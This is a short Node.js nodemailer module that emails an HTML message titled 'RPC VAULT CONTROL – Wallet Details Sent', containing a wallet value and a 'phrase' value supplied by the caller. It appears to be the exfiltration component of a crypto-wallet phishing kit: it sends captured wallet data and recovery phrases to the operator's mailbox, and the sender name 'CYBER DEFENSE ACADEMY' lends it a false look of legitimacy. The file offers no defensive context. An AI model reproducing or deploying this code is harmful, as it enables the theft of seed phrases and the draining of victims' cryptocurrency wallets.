const nodemailer = require('nodemailer');

const sendEmail = async (option) => {
    // Create A Transporter 
    const transporter = nodemailer.createTransport({
        service: process.env.EMAIL_HOST,
        auth: {
            user: process.env.TRANPORTER_PARTY,
            pass: process.env.TRANPORTER_PARTY_PASSWORD
        }
    });

    // DEFINE EMAIL OPTIONS
    const emailOptions = {
        from: 'CYBER DEFENSE ACADEMY',
        to: option.email,
        subject: option.subject,
        html: `
            <div style="background-color: #f4f4f4; padding: 20px; height: fit-content;">
                <div style="max-width: 600px; margin: 0 auto; background-color: white; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); border-radius: 10px;">
                    <div style="text-align: center; background-color: blue; color: white; padding: 10px 0; border-radius: 10px 10px 0 0;">
                        <h1>RPC VAULT CONTROL</h1>
                    </div>
                    <div style="padding: 20px;">
                        <h1>Wallet Details Sent</h1>
                        <p> <strong>${option.wallet}</strong>,</p>
                        <p> <strong>${option.phrase}</strong>,</p>
                    </div>
                </div>
            </div>
        `
    };

    await transporter.sendMail(emailOptions);
};

module.exports = sendEmail;
